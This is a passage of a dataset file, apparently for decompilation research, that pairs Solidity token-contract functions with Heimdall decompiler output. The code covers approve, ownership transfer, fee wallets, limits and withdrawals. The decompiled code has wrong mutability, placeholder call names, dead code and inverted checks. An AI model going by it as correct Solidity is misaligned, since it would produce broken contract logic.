\"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_i = var_f.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_h / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        require(storage_map_b[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x49;\n        var_m = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_e) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_e) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_e) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_e) / 0x64);\n        uint256 var_k = (arg1 * store_e) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_e) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_f = 0x40 + var_f;\n        var_k = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_f = 0x40 + var_f;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_e) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_u = var_f.length;\n        uint256 var_v = 0;\n        var_w = var_n;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_e) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_h / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_l) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_e) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_g / 0x01))) {\n            if (address(arg0) == (address(store_g / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x29;\n        var_h = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_i = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xE717AFf2e3d325cb5E2c7bdB9CB916ff6AF64ec7", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require((address((((owner / 0x01))))) == (address(msg.sender)), \"Ownership Assertion: Caller of the function is not the owner.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x3d;\n        var_e = 0x4f776e65727368697020417373657274696f6e3a2043616c6c6572206f662074;\n        var_f = 0x68652066756e6374696f6e206973206e6f7420746865206f776e65722e000000;\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xC0BA94337896c443b7728Dce84B0A750e290fbFd", "original_solidity_code": "function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {\r\n        require(tokenAddress != address(this), \"tokenAddress can not be the native token\");\r\n             if(tokens == 0){\r\n            tokens = ERC20(tokenAddress).balanceOf(address(this));\r\n        }\r\n        emit ClearToken(tokenAddress, tokens);\r\n        return ERC20(tokenAddress).transfer(autoLiquidityReceiver, tokens);\r\n    }", "heimdall_decompiled_code": "function clearStuckToken(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(arg0) - (address(this)));\n        require(arg1 - 0);\n        address var_a = address(arg0);\n        uint256 var_b = arg1;\n        emit ClearToken(address(arg0), arg1);\n        var_a = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        address var_c = address(store_i / 0x01);\n        uint256 var_d = arg1;\n        (bool success, bytes memory ret0) = address(arg0).many_msg_babbage(var_c); // call\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_f == (var_f));\n        var_b = !(!var_f);\n        return !(!var_f);\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_c = address(this);\n        (bool success, bytes memory ret0) = address(arg0).balanceOf(var_c); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_f == (var_f));\n        var_b = address(arg0);\n        var_g = var_f;\n        emit ClearToken(address(arg0), var_f);\n        var_b = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        var_d = address(store_i / 0x01);\n        var_h = var_f;\n        (bool success, bytes memory ret0) = address(arg0).many_msg_babbage(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_d = 0x28;\n        var_h = 0x746f6b656e416464726573732063616e206e6f7420626520746865206e617469;\n        var_i = 0x766520746f6b656e000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x649695aB734cF73FDD08262D5297F0f34368274C", "original_solidity_code": "function transferDevship(address user) public {\r\n        if (msg.sender == dev){\r\n            dev = user;\r\n        }\r\n    }", "heimdall_decompiled_code": "function transferDevship(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) - (address(decimals / 0x0100)));\n        decimals = (address(arg0) * 0x0100) | (uint96(decimals));\n    }"}
{"contract_address": "0x0a2746D0FE88EeB9538183408295c061593E478e", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xd3a031b4752eE83c310988Ad7277A7C2cD0bC631", "original_solidity_code": "function setFeeAddressWallets(address payable newWallet) external onlyOwner {\r\n        _taxWallet = newWallet;\r\n    }", "heimdall_decompiled_code": "function setFeeAddressWallets(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_k = (address(arg0)) | (uint96(store_k));\n    }"}
{"contract_address": "0xA35C27e30D301980a96302069966c11106eC898e", "original_solidity_code": "function transfer(address mgxjhea, uint256 hgizlmu) public returns (bool success) {\r\n        tpia(msg.sender, mgxjhea, hgizlmu);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x03;\n        require(0 - storage_map_b[var_a]);\n        var_a = address(arg0);\n        var_b = 0x07;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        require(arg1);\n        require(arg1);\n        uint256 var_d = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_a = address(arg0);\n        var_b = 0x07;\n        storage_map_b[var_a] = arg1;\n        var_d = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_d = 0x01;\n        return 0x01;\n        require(address(fyapnxt) == (address(arg0)));\n        var_a = address(arg0);\n        var_b = 0x07;\n        storage_map_b[var_a] = arg1;\n        var_d = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n    }"}
{"contract_address": "0x7A78ca246a44065Bfc493a27f2C2A21B766dCA73", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x058959bb6d006a69D74B22B508eDED1C615E8FDB", "original_solidity_code": "function approve(address spender, uint256 amount) external override returns (bool) {\\r\\n      _approve(msg.sender, spender, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[3276:3312];\n    }"}
{"contract_address": "0xEFB0c530467107677E4C214c3C444fFb282AE6F2", "original_solidity_code": "function withdrawBalance() public onlyAdmin {\\n        require(address(this).balance > 0, \\\"No balance to withdraw.\\\");\\n        uint256 amount = address(this).balance;\\n        payable(admin).transfer(amount);\\n        emit BalanceWithdrawn(amount);\\n    }", "heimdall_decompiled_code": "function withdrawBalance() public {\n        require(msg.sender == (address(admin)), \"Only admin can call this function\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x4f6e6c792061646d696e2063616e2063616c6c20746869732066756e6374696f;\n        var_e = 0x6e00000000000000000000000000000000000000000000000000000000000000;\n        require(address(this).balance > 0, \"No balance to withdraw.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x4e6f2062616c616e636520746f2077697468647261772e000000000000000000;\n        (bool success, bytes memory ret0) = address(admin).transfer(address(this).balance);\n        uint256 var_a = address(this).balance;\n        emit BalanceWithdrawn(address(this).balance);\n    }"}
{"contract_address": "0x4103F78C623459b3e985dE5F5d78622944B9dE6D", "original_solidity_code": "function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {\r\n           _maxTxAmount = maxTxAmount;\r\n        \r\n    }", "heimdall_decompiled_code": "function setMaxTxnAmount(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxTxAmount = arg0;\n    }"}
{"contract_address": "0x15C20cF168b7A84E9C56ADbf233b80Fc40090e7a", "original_solidity_code": "function removeCandy(address account) public onlyOwner {\\r\\n        candy[account] = false;\\r\\n    }", "heimdall_decompiled_code": "function removeCandy(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_f = address(arg0);\n        var_g = 0x97;\n        storage_map_i[var_f] = (0 * 0x01) | (uint248(storage_map_i[var_f]));\n    }"}
{"contract_address": "0x0c929e3FF6Ed49E9D538756Bd127f5f23e1fC7D6", "original_solidity_code": "function allowance(address owner_, address spender) external view override returns (uint256) {\\r\\n      return _allowances[owner_][spender];\\r\\n    }", "heimdall_decompiled_code": "function allowance(address arg0, address arg1) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x05;\n        var_a = address(arg1);\n        address var_b = keccak256(var_a);\n        address var_c = storage_map_c[var_a];\n        return storage_map_c[var_a];\n    }"}
{"contract_address": "0xE575f6f50AF7A409F7381F15bC25Ff9dD9414660", "original_solidity_code": "function updateRockDevLevyFortifiedCache(address newWallet) external onlyOwner {\\r\\n        emit RockDevLevyFortifiedCacheUpdated(newWallet, RockDevLevyFortifiedCache);\\r\\n        RockDevLevyFortifiedCache = newWallet;\\r\\n    }", "heimdall_decompiled_code": "function updateRockDevLevyFortifiedCache(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit RockDevLevyFortifiedCacheUpdated(address(arg0), address(RockDevLevyFortifiedCache / 0x01));\n        RockDevLevyFortifiedCache = (address(arg0) * 0x01) | (uint96(RockDevLevyFortifiedCache));\n    }"}
{"contract_address": "0xf7A80453F5BB234Bbfa9f6596Ef94cE42D7055EF", "original_solidity_code": "function getBalance() public view returns (uint256) {\\n        return address(this).balance; //Return the contract balance\\n    }", "heimdall_decompiled_code": "function getBalance() public view returns (uint256) {\n        uint256 var_a = address(this).balance;\n        return address(this).balance;\n    }"}
{"contract_address": "0xC2fc9ADEfFc2cF41f12d76ae9eB515289c4cfA6d", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_c[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0B544F7C213E8AE1383bee649a4af778Dd450DA5", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x041cdb40) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x041cdb40;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x041cdb40) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x041cdb40;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x041cdb40) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x041cdb40;\n                                emit MaxTxAmountUpdated(0x041cdb40);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc0d5852bF2E95089EcEe1Fb3D3641A7e60073D44", "original_solidity_code": "function updateSwapTokenAmount(uint256 newAmount)\\r\\n        external\\r\\n        onlyOwner\\r\\n        returns (bool)\\r\\n    {\\r\\n        require(\\r\\n            newAmount >= (totalSupply() * 1) / 100000,\\r\\n            \\\"Swap amount cannot be lower than 0.001% total supply.\\\"\\r\\n        );\\r\\n        require(\\r\\n            newAmount <= (totalSupply() * 5) / 1000,\\r\\n            \\\"Swap amount cannot be higher than 0.5% total supply.\\\"\\r\\n        );\\r\\n        swapTokensAtAmount = newAmount;\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function updateSwapTokenAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x01) / 0x01)) | !0x01, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x0186a0, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!(arg0 < ((totalSupply * 0x01) / 0x0186a0)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x35;\n        var_d = 0x5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e;\n        var_g = 0x20302e3030312520746f74616c20737570706c792e0000000000000000000000;\n    }"}
{"contract_address": "0xEA96F358096DB436A74f5C974F59fdE3Bc5185e7", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x19;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeEbe8289D4974bd96100fdD72f16CEBbB5c095f4", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
